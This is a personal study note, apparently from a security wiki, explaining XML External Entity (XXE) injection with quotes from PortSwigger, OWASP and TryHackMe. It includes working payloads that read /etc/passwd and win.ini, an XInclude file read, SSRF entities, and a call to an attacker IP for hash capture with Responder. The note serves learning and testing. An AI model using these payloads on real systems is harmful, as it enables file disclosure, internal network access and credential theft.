# XXE Injection

## Introduction

[TryHackMe defines XML as](https://tryhackme.com/r/room/xxeinjection) *"(Extensible Markup Language) is a markup language derived from SGML (Standard Generalized Markup Language), which is the same standard that HTML is based on."*. Visit local [[XML]] page for more details on the technicalities of XML. [TryHackMe articulates the significance](https://tryhackme.com/r/room/xxeinjection)  of *"XSLT (Extensible Stylesheet Language Transformations) is a language used to transform and format XML documents"*, because it is *"relevant to XXE (XML External Entities) attacks.*"

[XSLT](https://en.wikipedia.org/wiki/XSLT) is programmable (Turing complete according to Wikipedia) reads XML as input to:
- Return as output; and therefore XXE can be used for [[Data-Exfiltration]] and remotely if combined with [[Server-Side-Request-Forgery]]
- Modification through
	- Expanding entities: adding more to an element `<element> test="test" <attribute> New Attribute as content </attribute>`)
	- Injecting malicious data
	- Modifying existing data

[TryHackMe states DTDs](https://tryhackme.com/r/room/xxeinjection)  *"or Document Type Definitions define the structure and constraints of an XML document."* Used in XML Structural Validation and Entity Declaration the latter allows attackers to declare external entities like URLs, files, etc.
## XXE Injection

XML External Entity injection (XXE) - [OWASP](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) *"is a type of attack against an application that parses XML input. This attack occurs when **XML input containing a reference to an external entity is processed by a weakly configured XML parser**. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts."*

[Portswigger](https://portswigger.net/web-security/xxe): *"XML external entities are a type of custom XML entity whose defined values are loaded from outside of the DTD in which they are declared. External entities are particularly interesting from a security perspective because they allow an entity to be defined based on the contents of a file path or URL. "*

- File uploads
- Changing the content type `application/x-www-form-urlencoded`
## XXE to retrieve files

Exploiting XXE to retrieve files, where an external entity is defined containing the contents of a file, and returned in the application's response. Requires modification of the submitted XML either by:

- Introduce (or edit) a `DOCTYPE` element that defines an external entity containing the path to the file.
- Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.


[Portswigger](https://portswigger.net/web-security/xxe)'s example of stock level in shopping application:
`<?xml version="1.0" encoding="UTF-8"?> <stockCheck><productId>381</productId></stockCheck>`

`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>`

[Portswigger](https://portswigger.net/web-security/xxe) notes that with real-world XXE vulnerabilities, there are large number of data values with submitted XML - each individual data node must be systematically tested..
## XXE to SSRF attacks

Exploiting XXE to perform SSRF ([[Server-Side-Request-Forgery]]) attacks, where an external entity is defined based on a URL to a back-end system.

`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`

## Blind XXE to exfiltrate data out-of-band

Blind XXE to exfiltrate data out-of-band, where sensitive data is transmitted from the application server to a system that the attacker controls.

## Blind XXE to retrieve data via error messages
 
Blind XXE to retrieve data via error messages, where the attacker can trigger a parsing error message containing sensitive data.

`<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>`
## XInclude Attacks

If you do not control the entire XML document and therefore cannot define the `DOCTYPE` element it may be possible to use `XInclude` instead. `XInclude` is an element that allows an XML document to be built from sub-documents and can be place within any data value in an XML Document.

## XXE XML Entity injection

See [[XML]] for more about XML
```xml
<!--Last Line of Request -->

<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (ANY)> <!-- REF: (#ANY) instead of (ANY) -->
<!ENTITY file SYSTEM "file:///etc/passwd">
]> 
<xmlEntityInjection>
	<Author>Hacker1</Author> 
	<Subject>&file;</Subject>
	<Content>LearnDaXMLs3</Content>
</xmlEntityInjection>

<!--Notes -->
<!-- Creates a Header-->
<!-- System call to file variable->
<!-- Prints address file with &file -->
<!-- The two section must connect -->
```
[PayloadsAllTheThings - XXE ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/Files/Classic%20XXE%20-%20etc%20passwd.xml)

To exemplify, simplify the above and enumerate the OS with Arbitrary File Read
```xml
<!-- Either:  -->
<!-- SYSTEM "/etc/passwd"  -->
<!-- SYSTEM "file:///etc/passwd"  -->

<!--Windows  -->

<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<!--Entity is injected somewhere   -->
<placetoinject>
	&test;
</placetoinject>

<!--Linux  -->

<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<!--Entity is injected somewhere   -->
<placetoinject>
	&test;
</placetoinject>
```

XXE abuse [[Server-Side-Request-Forgery]] - and capture hashes with [[Responder-Cheatsheet]]
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://$yourIP$/test"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
The above is modified from HackTricks - [check Hacktricks for Blind SSRF, DTD abuse and others](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

#### RCE

If the [php expect wrapper](https://www.php.net/manual/en/wrappers.expect.php) is enabled:

## Mediation

Configuration of a XML interpreter disallowing the inclusion of external entities enabling attack against applications that interpret XML language in their parameters. 
- Disable support for `XInclude`


## References

[THM Walkthrough Room on XXE CVE-2021-29447](https://tryhackme.com/room/wordpresscve202129447)
[Portswigger](https://portswigger.net/web-security/xxe)
[BrightSec](https://brightsec.com/blog/xxe-attack/)
[OWASP](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
[PayloadsAllTheThings - XXE ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/Files/Classic%20XXE%20-%20etc%20passwd.xml)
[Hacktricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
[php expect wrapper Documentation](https://www.php.net/manual/en/wrappers.expect.php) 
[TryHackMe XXE Room](https://tryhackme.com/r/room/xxeinjection)
[Wikipedia XSLT](https://en.wikipedia.org/wiki/XSLT)